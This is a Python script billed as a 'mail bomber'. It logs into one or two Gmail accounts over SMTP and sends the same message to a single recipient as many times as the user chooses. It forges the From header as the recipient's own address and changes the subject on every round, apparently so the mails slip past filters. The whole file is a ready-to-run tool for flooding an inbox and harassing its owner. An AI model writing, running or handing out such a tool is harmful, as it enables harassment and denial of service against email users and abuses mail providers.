import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import sys

# Some show...
print(' ')
print("MAIL BOMBER BY V01DS!!! USE IT WISELY!!!")
print(' ')

# Setting up default things
port = 587  # For starttls
smtp_server = "smtp.gmail.com"

# Taking the inputs from the user
html_ask = input("Do you want to use html? y/N: ")
print(' ')

if html_ask == 'y':
    html_path =  input("Enter the html code input: ")
    print(' ')
    text = input("Enter the plain-text: ")
    print(' ')
    
    html_read = open(html_path, "r")
    html = html_read.read()
    html_read.close



if html_ask != 'y':
    message = input("Type your message you want to send: ")
    print(' ')

subject = input("Type the subject: ")
print(' ')

sender_mail = input("Type your mail and press enter: ")
print(' ')

sender_pass = input("Type your password and press enter: ")
print(' ')

sender_mail2 = input("Type your second mail and press enter, don't type anything if you don't use a second mail: ")
print(' ')

sender_pass2 = input("Type your second mails password and press enter: ")
print(' ')

reciever = input("Who are you sending the mail to?: ")
print(' ')

bomb_times = int(input("How many times do you want to send this mail?: "))
print(' ')




# Sending the mails 
def sendFirst():

    try:
        if html_ask == 'y':
            mail = MIMEMultipart("alternative")
            mail["From"] = reciever
            mail["Subject"] = subject
            mail["To"] = reciever
        
            part1 = MIMEText(text, "plain")
            part2 = MIMEText(html, "html")
            mail.attach(part1)
            mail.attach(part2)
            
            server = smtplib.SMTP('smtp.gmail.com:587') 
            server.ehlo()
            server.starttls()
            server.login(sender_mail, sender_pass)
            server.sendmail(sender_mail, reciever, mail.as_string())
            print('Mail sent from the first account')
    
        elif html_ask != 'y':
            mail = MIMEText(message, "html", "utf-8")
            mail["From"] = reciever
            mail["Subject"] = subject
            mail["To"] = reciever
            mail = mail.as_string()
            
            server = smtplib.SMTP('smtp.gmail.com:587') 
            server.starttls() 
            server.login(sender_mail, sender_pass)   
            server.sendmail(sender_mail, reciever, mail) 
            print('Mail sent from the first account')
          
    except KeyboardInterrupt:
        print("An error has occured")
        
def sendSecond():
    try:
        if html_ask == 'y':
            mail2 = MIMEMultipart("alternative")
            mail2["From"] = reciever
            mail2["Subject"] = subject
            mail2["To"] = reciever
        
            part1 = MIMEText(text, "plain")
            part2 = MIMEText(html, "html")
            mail2.attach(part1)
            mail2.attach(part2)
            
            server = smtplib.SMTP('smtp.gmail.com:587') 
            server.ehlo()
            server.starttls()
            server.login(sender_mail2, sender_pass2)
            server.sendmail(sender_mail2, reciever, mail2.as_string())
            print('Mail sent from the second account')
            
        elif html_ask != 'y':

            mail2 = MIMEText(message, "html", "utf-8")
            mail2["From"] = reciever
            mail2["Subject"] = subject
            mail2["To"] = reciever
            mail2 = mail2.as_string()
    
            server = smtplib.SMTP('smtp.gmail.com:587') 
            server.starttls() 
            server.login(sender_mail2, sender_pass2)   
            server.sendmail(sender_mail2, reciever, mail2) 
            print('Mail sent from the second account')
         
    except KeyboardInterrupt:
        print("An error has occured")

if sender_mail2 == '':        
    while bomb_times > 0:
        sendFirst()
        subject = subject + str(1)
        bomb_times = bomb_times - 1
    print(' ')
    print('----------------------------------------------------------')
    print(' ')
    print('All the mails are sent!')
else:
    while bomb_times > 0:
        sendFirst()
        sendSecond()
        subject = subject + str(1)
        bomb_times = bomb_times - 2
    print(' ')
    print('----------------------------------------------------------')
    print(' ')
    print('All the mails are sent!')
